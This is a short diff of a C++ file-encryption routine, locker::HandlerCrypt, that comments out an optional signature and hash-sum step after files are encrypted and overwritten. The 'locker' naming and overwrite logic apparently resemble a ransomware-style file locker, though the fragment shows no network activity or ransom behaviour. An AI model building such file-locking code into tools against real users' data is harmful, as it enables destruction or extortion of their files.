@@ -553,13 +553,13 @@ bool locker::HandlerCrypt
 	if (!CryptInfo->overwrite_method(CryptInfo, FileInfo.FileHandle, FileInfo.Filesize))
 		LOG_ERROR("[OverWriteFile] Failed; %s", data->Filename);
 
-	if (CommandParser::signature &&
-		CryptInfo->hash_sum_method
-		(
-			CryptInfo,
-			isCrypt ? FileInfo.FileHandle : FileInfo.newFileHandle,
-			isCrypt ? FileInfo.Filename : FileInfo.newFilename
-		));
+	// if (CommandParser::signature &&
+	// 	CryptInfo->hash_sum_method
+	// 	(
+	// 		CryptInfo,
+	// 		isCrypt ? FileInfo.FileHandle : FileInfo.newFileHandle,
+	// 		isCrypt ? FileInfo.Filename : FileInfo.newFilename
+	// 	));
 
 	if(success)
 		LOG_SUCCESS("success encrypt file; %s", data->Filename);
